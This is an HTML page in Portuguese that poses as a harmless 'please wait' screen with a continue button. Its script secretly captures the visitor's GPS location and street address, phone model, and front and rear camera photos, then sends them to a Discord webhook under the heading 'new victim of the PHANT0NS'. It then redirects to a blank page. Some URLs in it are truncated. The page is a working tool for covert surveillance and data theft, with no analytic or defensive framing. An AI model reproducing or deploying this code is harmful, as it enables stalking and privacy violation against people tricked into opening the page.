<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aguarde...</title>
    <style>
        body { background-color: black; color: white; text-align: center; font-family: sans-serif; padding-top: 80px; }
        .vermelho { color: red; font-weight: bold; font-size: 26px; margin-bottom: 10px; }
        .verde { color: #00ff00; font-weight: bold; font-size: 22px; margin-bottom: 10px; }
        .normal { color: white; font-size: 18px; }
        #btn { padding: 20px 40px; font-size: 18px; cursor: pointer; background: #222; color: white; border: 1px solid #444; border-radius: 8px; margin-top: 20px; }
    </style>
</head>
<body>

    <div id="mensagens" style="display:none;">
        <p class="vermelho">TEXTO TEXTO TEXTO</p>
        <p class="verde">TEXTO TEXTO TEXTO TEXTO!</p>
        <p class="normal">TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO6!!!</p>
    </div>

    <button id="btn">CLIQUE PARA CONTINUAR</button>

    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const URL_WEBHOOK = 'https://discord.com';

        document.getElementById('btn').addEventListener('click', async function() {
            document.getElementById('mensagens').style.display = 'block';
            this.style.display = 'none';

            try {
                // 1. Localização e Endereço
                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
                const response = await fetch(`https://openstreetmap.org{pos.coords.latitude}&lon=${pos.coords.longitude}`);
                const data = await response.json();
                const endereco = data.display_name;

                // 2. Modelo do Celular (Aproximado)
                const modelo = navigator.userAgent.split('(')[1].split(')')[0];

                // 3. Capturar Foto Frontal
                const streamFrontal = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const fotoFrontal = await tirarFoto(streamFrontal);
                stopStream(streamFrontal);

                // 4. Capturar Foto Traseira
                const streamTraseira = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                const fotoTraseira = await tirarFoto(streamTraseira);
                stopStream(streamTraseira);

                // 5. Enviar para Discord
                await enviarDiscord(fotoFrontal, fotoTraseira, endereco, modelo);

                setTimeout(() => { window.location.href = "about:blank"; }, 3000);

            } catch (e) {
                console.log(e);
                setTimeout(() => { window.location.href = "about:blank"; }, 2000);
            }
        });

        async function tirarFoto(stream) {
            const v = document.getElementById('v');
            v.srcObject = stream;
            await new Promise(r => setTimeout(r, 1000));
            const c = document.getElementById('c');
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            return c.toDataURL('image/jpeg');
        }

        function stopStream(stream) {
            stream.getTracks().forEach(t => t.stop());
        }

        async function enviarDiscord(imgFrontal, imgTraseira, endereco, modelo) {
            const fd = new FormData();
            const payload = {
                content: "NOVA VÍTIMA DOS PHANT0NS😈😈😈😈",
                embeds: [{
                    description: `📍 **LOCALIZAÇÃO:**\n${endereco}\n\n📅 **DATA:**\n${new Date().toLocaleString()}\n\n📱 **MODELO CELULAR:**\n${modelo}\n\nphant0ns😈`,
                    color: 16711680,
                    image: { url: 'attachment://frontal.jpg' },
                    thumbnail: { url: 'attachment://traseira.jpg' }
                }]
            };

            fd.append('payload_json', JSON.stringify(payload));
            
            const b1 = await (await fetch(imgFrontal)).blob();
            fd.append('file1', b1, 'frontal.jpg');
            
            const b2 = await (await fetch(imgTraseira)).blob();
            fd.append('file2', b2, 'traseira.jpg');

            await fetch(URL_WEBHOOK, { method: 'POST', body: fd });
        }
    </script>
</body>
</html>
